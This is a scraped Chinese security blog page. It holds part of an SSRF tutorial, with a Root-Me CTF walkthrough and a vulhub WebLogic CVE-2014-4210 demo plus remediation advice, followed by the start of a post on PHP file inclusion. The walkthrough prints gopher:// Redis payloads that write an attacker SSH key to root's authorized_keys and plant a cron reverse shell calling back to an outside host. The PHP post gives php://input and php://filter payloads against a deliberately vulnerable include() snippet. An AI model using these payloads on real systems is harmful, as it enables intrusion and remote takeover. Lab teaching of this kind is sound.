<h1 id="4-实战演示"><a href="#4-实战演示" class="headerlink" title="4. 实战演示"></a>4. 实战演示</h1><h2 id="4-1-漏洞环境"><a href="#4-1-漏洞环境" class="headerlink" title="4.1 漏洞环境"></a>4.1 漏洞环境</h2><p>Rootme CTF all the day</p>
<h2 id="4-2-漏洞地址"><a href="#4-2-漏洞地址" class="headerlink" title="4.2 漏洞地址"></a>4.2 漏洞地址</h2><p><a href="https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/" target="_blank" rel="noopener">https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/</a></p>
<h2 id="4-3-利用工具"><a href="#4-3-利用工具" class="headerlink" title="4.3 利用工具"></a>4.3 利用工具</h2><p>Burp</p>
<h2 id="4-4-漏洞介绍"><a href="#4-4-漏洞介绍" class="headerlink" title="4.4 漏洞介绍"></a>4.4 漏洞介绍</h2><p>SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的</p>
<h2 id="4-5-测试过程"><a href="#4-5-测试过程" class="headerlink" title="4.5 测试过程"></a>4.5 测试过程</h2><p>访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。</p>
<p>找到一个处于none的虚拟机，点击房间名，如下的ctf04</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143046-5ca3c27e-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143046-5ca3c27e-ce14-1.png" alt="img"></a></p>
<p>进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143046-5d0cebc8-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143046-5d0cebc8-ce14-1.png" alt="img"></a></p>
<p>过一段时间的等待后，会显示如下信息。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143047-5d6857c4-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143047-5d6857c4-ce14-1.png" alt="img"></a></p>
<p>访问 ctf04.root-me.org 就可以看到启动的虚拟环境了</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143047-5dbfebb0-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143047-5dbfebb0-ce14-1.png" alt="img"></a></p>
<p>当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。</p>
<p>访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143048-5e0f7cd4-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143048-5e0f7cd4-ce14-1.png" alt="img"></a></p>
<p>尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143048-5e62cf10-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143048-5e62cf10-ce14-1.png" alt="img"></a></p>
<p>读取系统文件：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143049-5ecc68da-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143049-5ecc68da-ce14-1.png" alt="img"></a></p>
<p>使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143050-5f135e66-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143050-5f135e66-ce14-1.png" alt="img"></a></p>
<p>探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。</p>
<p>详细内容可以查看文章：<a href="https://www.freebuf.com/vuls/162035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/162035.html</a></p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
<p>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</p>
<p>1）利用redis来写ssh密钥</p>
<p>此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下：</p>
<p>根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。</p>
<p>使用的payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>

<p>payload 解码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$401</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$11</span><br><span class="line">/root/.ssh/</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$15</span><br><span class="line">authorized_keys</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。</p>
<p>然后尝试登陆，输入创建密钥的密码后，登陆成功。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143050-5f6338be-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143050-5f6338be-ce14-1.png" alt="img"></a></p>
<p>2）利用redis写定时任务来反弹shell</p>
<p>既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。</p>
<p>使用payload为以下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>

<p>解码后的内容就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$61</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$16</span><br><span class="line">/var/spool/cron/</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$4</span><br><span class="line">root</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>来自：<a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p>
<p>其中$61为我的vps地址，也就是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143051-5fa53c50-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143051-5fa53c50-ce14-1.png" alt="img"></a></p>
<p>根据前文的提示，打开/passwd文件就可以找到flag了。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143100-6540d21e-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143100-6540d21e-ce14-1.png" alt="img"></a></p>
<p>在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143101-658e8810-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143101-658e8810-ce14-1.png" alt="img"></a></p>
<h1 id="5-CMS实战演示"><a href="#5-CMS实战演示" class="headerlink" title="5. CMS实战演示"></a>5. CMS实战演示</h1><h2 id="5-1-漏洞环境"><a href="#5-1-漏洞环境" class="headerlink" title="5.1 漏洞环境"></a>5.1 漏洞环境</h2><p>vulhub、weblogic、ssrf</p>
<h2 id="5-2-漏洞介绍"><a href="#5-2-漏洞介绍" class="headerlink" title="5.2 漏洞介绍"></a>5.2 漏洞介绍</h2><p>CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0</p>
<h2 id="5-3-下载地址"><a href="#5-3-下载地址" class="headerlink" title="5.3 下载地址"></a>5.3 下载地址</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p>
<p>下载vulhub后，进入对应的安装目录，执行<code>docker-compose up -d</code>,会自动创建docker镜像。</p>
<p>构建完成后访问如下地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp</span><br></pre></td></tr></table></figure>

<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143101-65e2a206-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143101-65e2a206-ce14-1.png" alt="img"></a></p>
<p>访问如下地址时返回，代表端口未开放：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80</span><br></pre></td></tr></table></figure>

<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143102-663805ac-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143102-663805ac-ce14-1.png" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>

<p>响应可以看到返回404，证明端口开放：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190903143102-668750d0-ce14-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190903143102-668750d0-ce14-1.png" alt="img"></a></p>
<p>然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。</p>
<h2 id="5-4-漏洞修复"><a href="#5-4-漏洞修复" class="headerlink" title="5.4 漏洞修复"></a>5.4 漏洞修复</h2><h3 id="5-4-1-删除server-lib-uddiexplorer-war下的相应jsp文件。"><a href="#5-4-1-删除server-lib-uddiexplorer-war下的相应jsp文件。" class="headerlink" title="5.4.1 删除server/lib/uddiexplorer.war下的相应jsp文件。"></a>5.4.1 删除server/lib/uddiexplorer.war下的相应jsp文件。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar -xvf uddiexplorer.war </span><br><span class="line">rm jsp-files </span><br><span class="line">jar -cvfM uddiexplorer.war uddiexplorer/</span><br></pre></td></tr></table></figure>

<h2 id="5-4-2-在官方的漏洞通报上找到补丁安装"><a href="#5-4-2-在官方的漏洞通报上找到补丁安装" class="headerlink" title="5.4.2 在官方的漏洞通报上找到补丁安装"></a>5.4.2 在官方的漏洞通报上找到补丁安装</h2><p><a href="https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></p>
<h1 id="6-漏洞修复"><a href="#6-漏洞修复" class="headerlink" title="6. 漏洞修复"></a>6. 漏洞修复</h1><h2 id="6-1-限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。"><a href="#6-1-限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。" class="headerlink" title="6.1 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。"></a>6.1 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。</h2><h2 id="6-2-对请求地址设置白名单，只允许请求白名单内的地址。"><a href="#6-2-对请求地址设置白名单，只允许请求白名单内的地址。" class="headerlink" title="6.2 对请求地址设置白名单，只允许请求白名单内的地址。"></a>6.2 对请求地址设置白名单，只允许请求白名单内的地址。</h2><h2 id="6-3-禁用除http和https外的协议，如：file-，gopher-，dict-等"><a href="#6-3-禁用除http和https外的协议，如：file-，gopher-，dict-等" class="headerlink" title="6.3 禁用除http和https外的协议，如：file://，gopher://，dict://等"></a>6.3 禁用除http和https外的协议，如：file://，gopher://，dict://等</h2><h2 id="6-4-限制请求的端口为固定服务端口，如：80，443"><a href="#6-4-限制请求的端口为固定服务端口，如：80，443" class="headerlink" title="6.4 限制请求的端口为固定服务端口，如：80，443"></a>6.4 限制请求的端口为固定服务端口，如：80，443</h2><h2 id="6-5-Java类代码修复（来自joychou）"><a href="#6-5-Java类代码修复（来自joychou）" class="headerlink" title="6.5 Java类代码修复（来自joychou）"></a>6.5 Java类代码修复（来自joychou）</h2><p>方法调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String[] urlwhitelist = &#123;&quot;joychou.com&quot;, &quot;joychou.me&quot;&#125;;</span><br><span class="line">if (!UrlSecCheck(url, urlwhitelist)) &#123;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法代码：</p>
<p>需要先添加guava库（目的是获取一级域名）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;guava&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;21.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">方法实现：</span><br><span class="line">public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u = new URL(url);</span><br><span class="line">        // 只允许http和https的协议</span><br><span class="line">        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">            return  false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取域名，并转为小写</span><br><span class="line">        String host = u.getHost().toLowerCase();</span><br><span class="line">        // 获取一级域名</span><br><span class="line">        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();</span><br><span class="line"></span><br><span class="line">        for (String whiteurl: urlwhitelist)&#123;</span><br><span class="line">            if (rootDomain.equals(whiteurl)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/php文件包含漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/17/php文件包含漏洞/" class="post-title-link" itemprop="url">php文件包含漏洞</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-17 12:10:35 / 修改时间：12:10:55" itemprop="dateCreated datePublished" datetime="2019-10-17T12:10:35+08:00">2019-10-17</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
<ol>
<li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="noopener">include()</a></li>
<li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="noopener">include_once()</a></li>
<li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="noopener">require()</a></li>
<li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="noopener">require_once()</a></li>
</ol>
<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" alt="img"></a></p>
<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" alt="img"></a></p>
<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file;?&gt;</span><br></pre></td></tr></table></figure>

<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt</span><br></pre></td></tr></table></figure>

<p>即可成功解析phpinfo。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" alt="img"></a></p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ol>
<li>具有相关的文件包含函数。</li>
<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
</ol>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<ol>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p>两个配置选项均需要为On，才能远程包含文件成功。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" alt="img"></a></p>
<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file;?&gt;</span><br></pre></td></tr></table></figure>

<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off</p>
<p>若有特殊要求，会在利用条件里指出。</p>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
<ol>
<li>allow_url_include = On。</li>
<li>对allow_url_fopen不做要求。</li>
</ol>
<p>姿势：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" alt="img"></a></p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：无甚</p>
<p>姿势：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg==&quot;)b&quot;&lt;?php \r\n\t$file = $_GET[&apos;file&apos;];\r\n\tinclude $file;\r\n?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>其他姿势：</p>
